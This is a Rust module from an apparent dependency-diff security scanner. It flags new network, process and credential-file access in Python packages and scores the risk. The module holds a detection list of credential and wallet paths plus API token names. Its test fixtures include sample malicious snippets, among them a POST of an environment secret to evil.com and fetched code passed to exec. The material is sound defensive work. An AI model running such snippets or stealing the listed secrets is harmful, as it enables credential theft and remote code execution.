use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::path::Path;

use super::tree::Ecosystem;

/// Configuration for self-inspection: inspecting the root package itself.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SelfInspectConfig {
    pub package_name: String,
    pub current_version: String,
}

/// A URL found in source code.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExtractedUrl {
    pub url: String,
    pub domain: String,
    pub file: String,
    pub line: u32,
    pub in_encoded_content: bool,
}

/// Extract URLs from Python source code.
pub fn extract_urls(source: &str, file: &str) -> Vec<ExtractedUrl> {
    let url_re = Regex::new(r#"https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+"#).unwrap();
    let mut urls = Vec::new();

    for (i, line) in source.lines().enumerate() {
        for m in url_re.find_iter(line) {
            let url = m.as_str().to_string();
            let domain = extract_domain(&url);
            urls.push(ExtractedUrl {
                url,
                domain,
                file: file.to_string(),
                line: (i + 1) as u32,
                in_encoded_content: false,
            });
        }
    }

    urls
}

fn extract_domain(url: &str) -> String {
    url.trim_start_matches("https://")
        .trim_start_matches("http://")
        .split('/')
        .next()
        .unwrap_or("")
        .split(':')
        .next()
        .unwrap_or("")
        .to_string()
}

/// Check if extracted domains match official package URLs.
/// Returns domains that DON'T match any official URL.
pub fn find_suspicious_domains<'a>(
    extracted: &'a [ExtractedUrl],
    official_domains: &[String],
) -> Vec<&'a ExtractedUrl> {
    extracted
        .iter()
        .filter(|u| {
            let domain = &u.domain;
            // Skip common safe domains
            let safe = [
                "pypi.org",
                "python.org",
                "github.com",
                "githubusercontent.com",
                "readthedocs.io",
                "readthedocs.org",
                "sphinx-doc.org",
                "example.com",
                "localhost",
                "127.0.0.1",
                "0.0.0.0",
            ];
            if safe.iter().any(|s| domain.contains(s)) {
                return false;
            }
            // Check against official domains
            !official_domains
                .iter()
                .any(|od| domain.contains(od) || od.contains(domain.as_str()))
        })
        .collect()
}

/// A capability that Python code can exercise.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Capability {
    Network,
    Filesystem,
    Crypto,
    Process,
    Encoding,
    Serialization,
    Reflection,
    EnvironmentAccess,
    CredentialHarvesting,
}

/// A detected capability usage at a specific location.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapabilityUsage {
    pub capability: Capability,
    pub file: String,
    pub line: u32,
    pub evidence: String,
    pub is_import: bool,
}

/// A branch point in source code.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BranchPoint {
    pub file: String,
    pub line: u32,
    pub condition: String,
    pub body_capabilities: Vec<Capability>,
}

/// Classification of file changes.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum FileChangeKind {
    Added,
    Removed,
    Modified {
        lines_added: usize,
        lines_removed: usize,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChange {
    pub path: String,
    pub kind: FileChangeKind,
    pub capabilities: Vec<Capability>,
}

/// How a capability changed between versions.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapabilityDelta {
    pub capability: Capability,
    pub added_count: usize,
    pub removed_count: usize,
    /// True if this capability was completely absent in old version.
    pub is_escalation: bool,
}

/// Suspicious compound pattern.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "pattern", rename_all = "snake_case")]
pub enum SuspiciousPattern {
    /// base64/encoding + network in same file.
    DataExfiltration { file: String, line: u32 },
    /// exec/eval/subprocess + network in same file.
    RemoteCodeExec { file: String, line: u32 },
    /// NEW os.environ/os.getenv + network in same file.
    CredentialAccess { file: String, line: u32 },
    /// __import__ with string construction.
    ObfuscatedImport { file: String, line: u32 },
    /// .pth file containing executable code (import/exec/subprocess/base64).
    PthInjection {
        file: String,
        line: u32,
        evidence: String,
    },
    /// exec/eval combined with high-entropy string or base64 decode.
    EncodedExecution {
        file: String,
        line: u32,
        evidence: String,
    },
    /// Credential harvesting combined with network access.
    CredentialExfiltration {
        file: String,
        line: u32,
        credential_types: Vec<String>,
    },
    /// URL to a domain not matching the package's official URLs.
    SuspiciousDomain {
        file: String,
        line: u32,
        domain: String,
        url: String,
    },
}

/// Complete source-level diff for a dependency version change.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DepSourceDiff {
    pub package: String,
    pub from_version: String,
    pub to_version: String,
    pub ecosystem: Ecosystem,
    pub file_changes: Vec<FileChange>,
    pub files_added: usize,
    pub files_removed: usize,
    pub files_modified: usize,
    pub branches_added: Vec<BranchPoint>,
    pub branches_removed: Vec<BranchPoint>,
    pub capability_deltas: Vec<CapabilityDelta>,
    pub suspicious_patterns: Vec<SuspiciousPattern>,
    pub risk_score: f64,
}

/// Import/call patterns mapped to capabilities.
const CAPABILITY_PATTERNS: &[(&str, Capability, bool)] = &[
    // Network
    ("import socket", Capability::Network, true),
    ("import requests", Capability::Network, true),
    ("import httpx", Capability::Network, true),
    ("import urllib", Capability::Network, true),
    ("import aiohttp", Capability::Network, true),
    ("import http.client", Capability::Network, true),
    ("from requests ", Capability::Network, true),
    ("from httpx ", Capability::Network, true),
    ("from urllib", Capability::Network, true),
    ("from aiohttp", Capability::Network, true),
    ("from http.client", Capability::Network, true),
    // Filesystem
    ("import pathlib", Capability::Filesystem, true),
    ("import shutil", Capability::Filesystem, true),
    ("import tempfile", Capability::Filesystem, true),
    ("from pathlib", Capability::Filesystem, true),
    ("from shutil", Capability::Filesystem, true),
    // Crypto
    ("import cryptography", Capability::Crypto, true),
    ("import hashlib", Capability::Crypto, true),
    ("import hmac", Capability::Crypto, true),
    ("import ssl", Capability::Crypto, true),
    ("import jwt", Capability::Crypto, true),
    ("from cryptography", Capability::Crypto, true),
    ("from jwt", Capability::Crypto, true),
    // Process
    ("import subprocess", Capability::Process, true),
    ("os.system(", Capability::Process, false),
    ("os.popen(", Capability::Process, false),
    ("subprocess.run(", Capability::Process, false),
    ("subprocess.Popen(", Capability::Process, false),
    ("subprocess.call(", Capability::Process, false),
    ("exec(", Capability::Process, false),
    ("eval(", Capability::Process, false),
    // Encoding
    ("import base64", Capability::Encoding, true),
    ("import codecs", Capability::Encoding, true),
    ("import binascii", Capability::Encoding, true),
    ("from base64", Capability::Encoding, true),
    ("base64.b64encode(", Capability::Encoding, false),
    ("base64.b64decode(", Capability::Encoding, false),
    // Serialization
    ("import pickle", Capability::Serialization, true),
    ("import marshal", Capability::Serialization, true),
    ("pickle.loads(", Capability::Serialization, false),
    ("yaml.load(", Capability::Serialization, false),
    // Reflection
    ("import importlib", Capability::Reflection, true),
    ("__import__(", Capability::Reflection, false),
    ("importlib.import_module(", Capability::Reflection, false),
    // Environment
    ("os.environ", Capability::EnvironmentAccess, false),
    ("os.getenv(", Capability::EnvironmentAccess, false),
    ("from dotenv", Capability::EnvironmentAccess, true),
    // Credential harvesting — file path patterns
    (".ssh/id_rsa", Capability::CredentialHarvesting, false),
    (".ssh/id_ed25519", Capability::CredentialHarvesting, false),
    (".ssh/known_hosts", Capability::CredentialHarvesting, false),
    (".ssh/authorized_keys", Capability::CredentialHarvesting, false),
    (".gnupg/", Capability::CredentialHarvesting, false),
    (".aws/credentials", Capability::CredentialHarvesting, false),
    (".aws/config", Capability::CredentialHarvesting, false),
    (".config/gcloud/", Capability::CredentialHarvesting, false),
    (".azure/", Capability::CredentialHarvesting, false),
    (".kube/config", Capability::CredentialHarvesting, false),
    ("KUBECONFIG", Capability::CredentialHarvesting, false),
    // Crypto wallets
    (".bitcoin/", Capability::CredentialHarvesting, false),
    (".ethereum/", Capability::CredentialHarvesting, false),
    ("wallet.dat", Capability::CredentialHarvesting, false),
    (".solana/", Capability::CredentialHarvesting, false),
    ("phantom", Capability::CredentialHarvesting, false),
    ("metamask", Capability::CredentialHarvesting, false),
    // AI/LLM credentials
    (".claude/", Capability::CredentialHarvesting, false),
    (".config/claude", Capability::CredentialHarvesting, false),
    ("ANTHROPIC_API_KEY", Capability::CredentialHarvesting, false),
    ("OPENAI_API_KEY", Capability::CredentialHarvesting, false),
    ("GOOGLE_AI_KEY", Capability::CredentialHarvesting, false),
    ("GEMINI_API_KEY", Capability::CredentialHarvesting, false),
    // Package manager tokens
    (".npmrc", Capability::CredentialHarvesting, false),
    (".pypirc", Capability::CredentialHarvesting, false),
    ("NPM_TOKEN", Capability::CredentialHarvesting, false),
    ("PYPI_TOKEN", Capability::CredentialHarvesting, false),
    ("CARGO_REGISTRY_TOKEN", Capability::CredentialHarvesting, false),
    // Git credentials
    (".git-credentials", Capability::CredentialHarvesting, false),
    ("GITHUB_TOKEN", Capability::CredentialHarvesting, false),
    ("GH_TOKEN", Capability::CredentialHarvesting, false),
    ("GITLAB_TOKEN", Capability::CredentialHarvesting, false),
];

/// Branch-starting keywords for Python.
const BRANCH_KEYWORDS: &[&str] = &[
    "if ", "elif ", "else:", "for ", "while ", "try:", "except ", "except:", "finally:", "with ",
];

/// Scan a Python source file for capability usages.
pub fn scan_capabilities(source: &str, file: &str) -> Vec<CapabilityUsage> {
    let mut usages = Vec::new();
    for (line_num, line) in source.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        for &(pattern, capability, is_import) in CAPABILITY_PATTERNS {
            if trimmed.contains(pattern) {
                usages.push(CapabilityUsage {
                    capability,
                    file: file.to_string(),
                    line: (line_num + 1) as u32,
                    evidence: truncate_str(trimmed, 120),
                    is_import,
                });
                break; // one match per line is enough
            }
        }
    }
    usages
}

/// Enumerate branch points in a Python source file.
pub fn enumerate_branch_points(source: &str, file: &str) -> Vec<BranchPoint> {
    let mut branches = Vec::new();
    let lines: Vec<&str> = source.lines().collect();

    for (i, line) in lines.iter().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with('#') {
            continue;
        }
        let is_branch = BRANCH_KEYWORDS.iter().any(|kw| trimmed.starts_with(kw));
        if !is_branch {
            continue;
        }

        // Look ahead up to 30 lines for capabilities in this branch body
        let indent = line.len() - line.trim_start().len();
        let mut body_caps: HashSet<Capability> = HashSet::new();
        for j in (i + 1)..lines.len().min(i + 30) {
            let next = lines[j];
            let next_indent = next.len() - next.trim_start().len();
            if !next.trim().is_empty() && next_indent <= indent {
                break; // exited the block
            }
            for cap_usage in scan_capabilities(next, file) {
                body_caps.insert(cap_usage.capability);
            }
        }

        branches.push(BranchPoint {
            file: file.to_string(),
            line: (i + 1) as u32,
            condition: truncate_str(trimmed, 100),
            body_capabilities: body_caps.into_iter().collect(),
        });
    }

    branches
}

/// Diff two source directories and produce a DepSourceDiff.
pub fn diff_source_dirs(
    old_dir: &Path,
    new_dir: &Path,
    package: &str,
    from_version: &str,
    to_version: &str,
    ecosystem: Ecosystem,
) -> DepSourceDiff {
    let old_files = collect_py_files(old_dir);
    let new_files = collect_py_files(new_dir);

    let old_keys: HashSet<&str> = old_files.keys().map(|s| s.as_str()).collect();
    let new_keys: HashSet<&str> = new_files.keys().map(|s| s.as_str()).collect();

    let mut file_changes = Vec::new();
    let mut branches_added = Vec::new();
    let mut branches_removed = Vec::new();
    let mut all_old_caps: HashMap<Capability, usize> = HashMap::new();
    let mut all_new_caps: HashMap<Capability, usize> = HashMap::new();
    let mut files_added = 0usize;
    let mut files_removed = 0usize;
    let mut files_modified = 0usize;

    // Added files
    for key in new_keys.difference(&old_keys) {
        let content = &new_files[*key];
        let caps = scan_capabilities(content, key);
        let unique_caps: HashSet<Capability> = caps.iter().map(|c| c.capability).collect();
        for &cap in &unique_caps {
            *all_new_caps.entry(cap).or_default() += 1;
        }
        let new_branches = enumerate_branch_points(content, key);
        branches_added.extend(new_branches);
        file_changes.push(FileChange {
            path: key.to_string(),
            kind: FileChangeKind::Added,
            capabilities: unique_caps.into_iter().collect(),
        });
        files_added += 1;
    }

    // Removed files
    for key in old_keys.difference(&new_keys) {
        let content = &old_files[*key];
        let caps = scan_capabilities(content, key);
        let unique_caps: HashSet<Capability> = caps.iter().map(|c| c.capability).collect();
        for &cap in &unique_caps {
            *all_old_caps.entry(cap).or_default() += 1;
        }
        let old_branches = enumerate_branch_points(content, key);
        branches_removed.extend(old_branches);
        file_changes.push(FileChange {
            path: key.to_string(),
            kind: FileChangeKind::Removed,
            capabilities: unique_caps.into_iter().collect(),
        });
        files_removed += 1;
    }

    // Modified files
    for key in old_keys.intersection(&new_keys) {
        let old_content = &old_files[*key];
        let new_content = &new_files[*key];
        if old_content == new_content {
            // Also count unchanged capabilities for delta calculation
            let caps = scan_capabilities(new_content, key);
            for c in &caps {
                *all_old_caps.entry(c.capability).or_default() += 1;
                *all_new_caps.entry(c.capability).or_default() += 1;
            }
            continue;
        }

        let old_lines: HashSet<&str> = old_content.lines().collect();
        let new_lines: HashSet<&str> = new_content.lines().collect();
        let lines_added = new_lines.difference(&old_lines).count();
        let lines_removed = old_lines.difference(&new_lines).count();

        let old_caps = scan_capabilities(old_content, key);
        let new_caps = scan_capabilities(new_content, key);
        for c in &old_caps {
            *all_old_caps.entry(c.capability).or_default() += 1;
        }
        for c in &new_caps {
            *all_new_caps.entry(c.capability).or_default() += 1;
        }

        let new_unique: HashSet<Capability> = new_caps.iter().map(|c| c.capability).collect();

        let old_branches = enumerate_branch_points(old_content, key);
        let new_branches = enumerate_branch_points(new_content, key);

        // Branch diff: compare by (file, condition_text)
        let old_branch_sigs: HashSet<String> = old_branches
            .iter()
            .map(|b| format!("{}:{}", b.file, b.condition))
            .collect();
        let new_branch_sigs: HashSet<String> = new_branches
            .iter()
            .map(|b| format!("{}:{}", b.file, b.condition))
            .collect();

        for b in &new_branches {
            let sig = format!("{}:{}", b.file, b.condition);
            if !old_branch_sigs.contains(&sig) {
                branches_added.push(b.clone());
            }
        }
        for b in &old_branches {
            let sig = format!("{}:{}", b.file, b.condition);
            if !new_branch_sigs.contains(&sig) {
                branches_removed.push(b.clone());
            }
        }

        file_changes.push(FileChange {
            path: key.to_string(),
            kind: FileChangeKind::Modified {
                lines_added,
                lines_removed,
            },
            capabilities: new_unique.into_iter().collect(),
        });
        files_modified += 1;
    }

    // Capability deltas
    let all_caps: HashSet<Capability> = all_old_caps
        .keys()
        .chain(all_new_caps.keys())
        .copied()
        .collect();
    let mut capability_deltas = Vec::new();
    for cap in all_caps {
        let old_count = all_old_caps.get(&cap).copied().unwrap_or(0);
        let new_count = all_new_caps.get(&cap).copied().unwrap_or(0);
        if old_count != new_count {
            capability_deltas.push(CapabilityDelta {
                capability: cap,
                added_count: new_count.saturating_sub(old_count),
                removed_count: old_count.saturating_sub(new_count),
                is_escalation: old_count == 0 && new_count > 0,
            });
        }
    }

    // Suspicious patterns: check each new/modified file for compound patterns
    let mut suspicious_patterns = detect_suspicious_patterns(&new_files, &old_files);
    suspicious_patterns.extend(scan_pth_files(new_dir));

    // Risk scoring
    let risk_score = score_source_diff(
        &capability_deltas,
        &suspicious_patterns,
        files_added,
        files_modified,
        files_removed,
        &branches_added,
    );

    DepSourceDiff {
        package: package.to_string(),
        from_version: from_version.to_string(),
        to_version: to_version.to_string(),
        ecosystem,
        file_changes,
        files_added,
        files_removed,
        files_modified,
        branches_added,
        branches_removed,
        capability_deltas,
        suspicious_patterns,
        risk_score,
    }
}

/// Compute Shannon entropy in bits per character.
fn shannon_entropy(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut freq = [0u32; 256];
    for &b in s.as_bytes() {
        freq[b as usize] += 1;
    }
    let len = s.len() as f64;
    freq.iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// Extract string literals from Python source and check for high entropy.
/// Returns (line_number, the_string, entropy) for strings > 40 chars with entropy > 4.5.
fn find_high_entropy_strings(source: &str) -> Vec<(u32, String, f64)> {
    let mut results = Vec::new();
    for (i, line) in source.lines().enumerate() {
        let trimmed = line.trim();
        for delim in ['"', '\''] {
            let chars: Vec<char> = trimmed.chars().collect();
            let mut j = 0;
            while j < chars.len() {
                if chars[j] == delim {
                    // Check for triple-quote
                    let triple =
                        j + 2 < chars.len() && chars[j + 1] == delim && chars[j + 2] == delim;
                    let end_delim = if triple { 3 } else { 1 };
                    let start = j + end_delim;
                    // Find closing delimiter
                    let mut k = start;
                    let mut found_end = false;
                    while k < chars.len() {
                        if triple {
                            if k + 2 < chars.len()
                                && chars[k] == delim
                                && chars[k + 1] == delim
                                && chars[k + 2] == delim
                            {
                                found_end = true;
                                break;
                            }
                        } else if chars[k] == delim && (k == 0 || chars[k - 1] != '\\') {
                            found_end = true;
                            break;
                        }
                        k += 1;
                    }
                    if found_end && k > start {
                        let s: String = chars[start..k].iter().collect();
                        if s.len() > 40 {
                            let ent = shannon_entropy(&s);
                            if ent > 4.5 {
                                results.push((
                                    (i + 1) as u32,
                                    s[..s.len().min(80)].to_string(),
                                    ent,
                                ));
                            }
                        }
                    }
                    j = k + end_delim;
                } else {
                    j += 1;
                }
            }
        }
    }
    results
}

/// Detect suspicious compound patterns in new/modified files.
fn detect_suspicious_patterns(
    new_files: &HashMap<String, String>,
    old_files: &HashMap<String, String>,
) -> Vec<SuspiciousPattern> {
    let mut patterns = Vec::new();

    for (path, content) in new_files {
        let caps = scan_capabilities(content, path);
        let cap_set: HashSet<Capability> = caps.iter().map(|c| c.capability).collect();

        let is_new_file = !old_files.contains_key(path);
        let old_caps: HashSet<Capability> = if let Some(old) = old_files.get(path) {
            scan_capabilities(old, path)
                .iter()
                .map(|c| c.capability)
                .collect()
        } else {
            HashSet::new()
        };

        // Data exfiltration: encoding + network
        if cap_set.contains(&Capability::Encoding) && cap_set.contains(&Capability::Network) {
            let line = caps
                .iter()
                .find(|c| c.capability == Capability::Encoding)
                .map(|c| c.line)
                .unwrap_or(0);
            patterns.push(SuspiciousPattern::DataExfiltration {
                file: path.clone(),
                line,
            });
        }

        // Remote code exec: process + network
        if cap_set.contains(&Capability::Process) && cap_set.contains(&Capability::Network) {
            let line = caps
                .iter()
                .find(|c| c.capability == Capability::Process)
                .map(|c| c.line)
                .unwrap_or(0);
            patterns.push(SuspiciousPattern::RemoteCodeExec {
                file: path.clone(),
                line,
            });
        }

        // Credential access: NEW env access + network
        let env_is_new = cap_set.contains(&Capability::EnvironmentAccess)
            && (is_new_file || !old_caps.contains(&Capability::EnvironmentAccess));
        if env_is_new && cap_set.contains(&Capability::Network) {
            let line = caps
                .iter()
                .find(|c| c.capability == Capability::EnvironmentAccess)
                .map(|c| c.line)
                .unwrap_or(0);
            patterns.push(SuspiciousPattern::CredentialAccess {
                file: path.clone(),
                line,
            });
        }

        // Obfuscated import: __import__ with string construction
        for (i, src_line) in content.lines().enumerate() {
            let trimmed = src_line.trim();
            if trimmed.contains("__import__(") || trimmed.contains("importlib.import_module(") {
                if trimmed.contains("join(")
                    || trimmed.contains("chr(")
                    || trimmed.contains("+ ")
                {
                    patterns.push(SuspiciousPattern::ObfuscatedImport {
                        file: path.clone(),
                        line: (i + 1) as u32,
                    });
                }
            }
        }

        // CredentialExfiltration: credential harvesting + network
        let has_cred = cap_set.contains(&Capability::CredentialHarvesting);
        let has_net = cap_set.contains(&Capability::Network);
        if has_cred && has_net {
            // Collect what types of credentials are being accessed
            let cred_types: Vec<String> = caps
                .iter()
                .filter(|c| c.capability == Capability::CredentialHarvesting)
                .map(|c| {
                    if c.evidence.contains(".ssh") {
                        "ssh_keys"
                    } else if c.evidence.contains(".aws") || c.evidence.contains("AWS") {
                        "aws_credentials"
                    } else if c.evidence.contains("wallet")
                        || c.evidence.contains(".bitcoin")
                        || c.evidence.contains(".ethereum")
                        || c.evidence.contains(".solana")
                    {
                        "crypto_wallets"
                    } else if c.evidence.contains("claude")
                        || c.evidence.contains("ANTHROPIC")
                        || c.evidence.contains("OPENAI")
                        || c.evidence.contains("GEMINI")
                    {
                        "ai_credentials"
                    } else if c.evidence.contains(".npmrc")
                        || c.evidence.contains("NPM_TOKEN")
                        || c.evidence.contains(".pypirc")
                    {
                        "package_tokens"
                    } else if c.evidence.contains("GITHUB")
                        || c.evidence.contains("GITLAB")
                        || c.evidence.contains(".git-credentials")
                    {
                        "git_tokens"
                    } else {
                        "other_credentials"
                    }
                })
                .map(String::from)
                .collect::<std::collections::HashSet<_>>()
                .into_iter()
                .collect();

            let line = caps
                .iter()
                .find(|c| c.capability == Capability::CredentialHarvesting)
                .map(|c| c.line)
                .unwrap_or(0);

            patterns.push(SuspiciousPattern::CredentialExfiltration {
                file: path.clone(),
                line,
                credential_types: cred_types,
            });
        }

        // EncodedExecution: exec/eval + base64 in same file (regardless of network)
        if cap_set.contains(&Capability::Process) && cap_set.contains(&Capability::Encoding) {
            let line = caps
                .iter()
                .find(|c| c.capability == Capability::Process)
                .map(|c| c.line)
                .unwrap_or(0);
            let evidence = caps
                .iter()
                .find(|c| c.capability == Capability::Process)
                .map(|c| c.evidence.clone())
                .unwrap_or_default();
            patterns.push(SuspiciousPattern::EncodedExecution {
                file: path.clone(),
                line,
                evidence,
            });
        }

        // EncodedExecution: exec/eval + high-entropy string in same file
        let has_exec =
            content.contains("exec(") || content.contains("eval(") || content.contains("compile(");
        if has_exec {
            let high_entropy = find_high_entropy_strings(content);
            if !high_entropy.is_empty() {
                let (he_line, s, ent) = &high_entropy[0];
                patterns.push(SuspiciousPattern::EncodedExecution {
                    file: path.clone(),
                    line: *he_line,
                    evidence: format!(
                        "exec/eval + high-entropy string (entropy={:.2}): {}...",
                        ent,
                        &s[..s.len().min(60)]
                    ),
                });
            }
        }
    }

    patterns
}

/// Score source-level changes.
fn score_source_diff(
    deltas: &[CapabilityDelta],
    patterns: &[SuspiciousPattern],
    _files_added: usize,
    files_modified: usize,
    _files_removed: usize,
    branches_added: &[BranchPoint],
) -> f64 {
    let mut score = 0.0_f64;

    // Capability escalations
    for delta in deltas {
        if delta.is_escalation {
            score += match delta.capability {
                Capability::Network | Capability::Process | Capability::CredentialHarvesting => 3.0,
                _ => 2.0,
            };
        }
    }

    // Suspicious patterns
    for pattern in patterns {
        score += match pattern {
            SuspiciousPattern::RemoteCodeExec { .. } => 5.0,
            SuspiciousPattern::DataExfiltration { .. } => 4.0,
            SuspiciousPattern::CredentialAccess { .. } => 4.0,
            SuspiciousPattern::ObfuscatedImport { .. } => 3.0,
            SuspiciousPattern::PthInjection { .. } => 5.0,
            SuspiciousPattern::EncodedExecution { .. } => 5.0,
            SuspiciousPattern::CredentialExfiltration { .. } => 5.0,
            SuspiciousPattern::SuspiciousDomain { .. } => 2.0,
        };
    }

    // New branches with capabilities
    let cap_branches: usize = branches_added
        .iter()
        .filter(|b| !b.body_capabilities.is_empty())
        .count();
    score += (cap_branches as f64 * 0.5).min(3.0);

    // Large churn
    if files_modified > 20 {
        score += 1.0;
    }

    score.min(10.0)
}

/// Scan for dangerous .pth files in a package directory.
/// .pth files execute arbitrary Python code on every interpreter startup.
pub fn scan_pth_files(dir: &Path) -> Vec<SuspiciousPattern> {
    let mut patterns = Vec::new();
    scan_pth_recursive(dir, dir, &mut patterns);
    patterns
}

fn scan_pth_recursive(base: &Path, current: &Path, patterns: &mut Vec<SuspiciousPattern>) {
    let entries = match std::fs::read_dir(current) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            scan_pth_recursive(base, &path, patterns);
        } else if path.extension().map(|e| e == "pth").unwrap_or(false) {
            let rel = path
                .strip_prefix(base)
                .unwrap_or(&path)
                .to_string_lossy()
                .to_string();
            if let Ok(content) = std::fs::read_to_string(&path) {
                let dangerous_patterns = [
                    "import ",
                    "exec(",
                    "eval(",
                    "subprocess",
                    "base64",
                    "__import__",
                    "os.system",
                ];
                for (line_num, line) in content.lines().enumerate() {
                    let trimmed = line.trim();
                    if trimmed.is_empty() || trimmed.starts_with('#') {
                        continue;
                    }
                    for &dp in &dangerous_patterns {
                        if trimmed.contains(dp) {
                            patterns.push(SuspiciousPattern::PthInjection {
                                file: rel.clone(),
                                line: (line_num + 1) as u32,
                                evidence: truncate_str(trimmed, 120),
                            });
                            break;
                        }
                    }
                }
            }
        }
    }
}

/// Collect all .py files from a directory recursively.
fn collect_py_files(dir: &Path) -> HashMap<String, String> {
    let mut files = HashMap::new();
    if !dir.exists() {
        return files;
    }
    collect_py_files_recursive(dir, dir, &mut files);
    files
}

fn collect_py_files_recursive(base: &Path, current: &Path, files: &mut HashMap<String, String>) {
    let entries = match std::fs::read_dir(current) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            if path
                .file_name()
                .map(|n| n.to_str().unwrap_or(""))
                .unwrap_or("")
                == "__pycache__"
            {
                continue;
            }
            collect_py_files_recursive(base, &path, files);
        } else if path.extension().map(|e| e == "py").unwrap_or(false) {
            let rel = path.strip_prefix(base).unwrap_or(&path);
            if let Ok(content) = std::fs::read_to_string(&path) {
                files.insert(rel.to_string_lossy().to_string(), content);
            }
        }
    }
}

fn truncate_str(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}...", &s[..max.saturating_sub(3)])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scan_network_import() {
        let source = "import httpx\nclient = httpx.Client()\n";
        let caps = scan_capabilities(source, "test.py");
        assert_eq!(caps.len(), 1);
        assert_eq!(caps[0].capability, Capability::Network);
        assert!(caps[0].is_import);
    }

    #[test]
    fn scan_process_call() {
        let source = "import os\nresult = os.system('ls')\n";
        let caps = scan_capabilities(source, "test.py");
        assert!(caps.iter().any(|c| c.capability == Capability::Process));
    }

    #[test]
    fn scan_env_access() {
        let source = "api_key = os.environ['API_KEY']\n";
        let caps = scan_capabilities(source, "test.py");
        assert!(caps
            .iter()
            .any(|c| c.capability == Capability::EnvironmentAccess));
    }

    #[test]
    fn scan_no_capabilities_in_comment() {
        let source = "# import subprocess\nprint('hello')\n";
        let caps = scan_capabilities(source, "test.py");
        assert!(caps.is_empty());
    }

    #[test]
    fn enumerate_branches_basic() {
        let source =
            "def foo():\n    if x > 0:\n        return True\n    else:\n        return False\n";
        let branches = enumerate_branch_points(source, "test.py");
        assert_eq!(branches.len(), 2); // if + else
    }

    #[test]
    fn enumerate_branches_with_capability() {
        let source = "if should_send:\n    import httpx\n    httpx.post(url)\n";
        let branches = enumerate_branch_points(source, "test.py");
        assert_eq!(branches.len(), 1);
        assert!(branches[0].body_capabilities.contains(&Capability::Network));
    }

    #[test]
    fn suspicious_data_exfiltration() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "evil.py".to_string(),
            "import base64\nimport httpx\ndata = base64.b64encode(secret)\nhttpx.post(url, data=data)\n"
                .to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::DataExfiltration { .. })));
    }

    #[test]
    fn suspicious_remote_code_exec() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "rce.py".to_string(),
            "import httpx\ncode = httpx.get(url).text\nexec(code)\n".to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::RemoteCodeExec { .. })));
    }

    #[test]
    fn suspicious_credential_access() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "steal.py".to_string(),
            "import httpx\nkey = os.environ['SECRET_KEY']\nhttpx.post('https://evil.com', data=key)\n"
                .to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::CredentialAccess { .. })));
    }

    #[test]
    fn no_credential_access_if_env_existed_before() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "existing.py".to_string(),
            "import httpx\nkey = os.environ['KEY']\n".to_string(),
        );
        let mut old_files = HashMap::new();
        old_files.insert(
            "existing.py".to_string(),
            "import httpx\nkey = os.environ['KEY']\n".to_string(),
        );
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        // Should NOT flag because env access existed in old version
        assert!(!patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::CredentialAccess { .. })));
    }

    #[test]
    fn obfuscated_import() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "obfuscated.py".to_string(),
            "mod = ''.join([chr(x) for x in [115, 117, 98]])\n__import__(mod + 'process')\n"
                .to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::ObfuscatedImport { .. })));
    }

    #[test]
    fn capability_escalation_scoring() {
        let deltas = vec![CapabilityDelta {
            capability: Capability::Network,
            added_count: 1,
            removed_count: 0,
            is_escalation: true,
        }];
        let score = score_source_diff(&deltas, &[], 0, 0, 0, &[]);
        assert!((score - 3.0).abs() < 0.01);
    }

    #[test]
    fn risk_score_capped_at_10() {
        let deltas = vec![
            CapabilityDelta {
                capability: Capability::Network,
                added_count: 1,
                removed_count: 0,
                is_escalation: true,
            },
            CapabilityDelta {
                capability: Capability::Process,
                added_count: 1,
                removed_count: 0,
                is_escalation: true,
            },
        ];
        let patterns = vec![
            SuspiciousPattern::RemoteCodeExec {
                file: "x.py".to_string(),
                line: 1,
            },
            SuspiciousPattern::DataExfiltration {
                file: "x.py".to_string(),
                line: 2,
            },
        ];
        let score = score_source_diff(&deltas, &patterns, 0, 0, 0, &[]);
        assert_eq!(score, 10.0);
    }

    #[test]
    fn diff_source_dirs_basic() {
        let dir = tempfile::tempdir().unwrap();
        let old_dir = dir.path().join("old");
